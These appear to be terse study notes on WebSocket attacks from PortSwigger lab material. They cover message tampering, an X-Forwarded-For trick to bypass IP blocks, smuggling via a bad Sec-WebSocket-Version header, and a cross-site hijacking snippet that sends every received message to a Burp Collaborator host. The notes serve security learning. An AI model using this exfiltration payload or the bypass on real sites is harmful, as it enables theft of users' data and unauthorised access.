# WebSocket




###### notes: 
- read [this](https://portswigger.net/web-security/websockets#replaying-and-generating-new-websocket-messages) to generate new WebSocket
- read [this](https://portswigger.net/web-security/websockets#manipulating-websocket-connections) for manipulating WebSockets
- most WebSocket vulnerabilites can be found by tampering with the content Websocket of messages
- `X-Forwarded-For` can be used to bypass ip address block 
- basic method to establish WebSocket connection using javascript
```javascript
var ws = new WebSocket("wss://website.com/chat");//wss for ssl
ws.send("Peter Wiener"); // send message
```
- WebSocket hijacking is simple if no CSRF tokens: 
```javascript
var ws = new WebSocket("wss://target/chat");
ws.onopen = function(){
ws.send("READY");
}
ws.onmessage = function(event){
fetch("burp-collaborator",{method:'POST',body:event.data,mode:'no-cors'})
}

```

###### WebSocket smuggling requests notes:
- reverse proxy doesn't validate headers and backend response status, by sending invalid version in `Sec-WebSocket-Version` header, now the client can access the internal REST API or any internal | Varnish refused to fix this.
- -
- 

- dom-based websocket url poisoning 
- [dom based](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)